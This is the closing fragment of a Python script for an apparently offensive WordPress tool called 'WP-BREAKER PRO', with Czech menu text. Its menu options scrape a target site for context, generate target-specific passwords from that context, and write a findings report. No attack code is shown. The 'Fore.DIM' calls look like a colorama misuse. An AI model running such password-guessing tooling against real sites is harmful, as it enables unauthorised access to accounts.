            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "8":
            scraper = AIContextScraper(TARGET, output)
            scraper.scrape()
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "9":
            scraper = AIContextScraper(TARGET, output)
            context = scraper.scrape()
            pwd_gen = AIPasswordGenerator(context, output)
            pwd_gen.generate()
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        elif choice == "10":
            reporter = AIReportGenerator(TARGET, output)
            reporter.generate(output.findings, {}, [], [], {})
            print(f"\n  {Fore.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
            input()
        
        else:
            print(f"\n  {Fore.RED}[✗]{Style.RESET_ALL} Neplatná volba! Stiskněte Enter...{Style.RESET_ALL}", end="")
            input()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {Fore.YELLOW}WP-BREAKER PRO ukončen uživatelem.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n\n  {Fore.RED}Kritická chyba: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
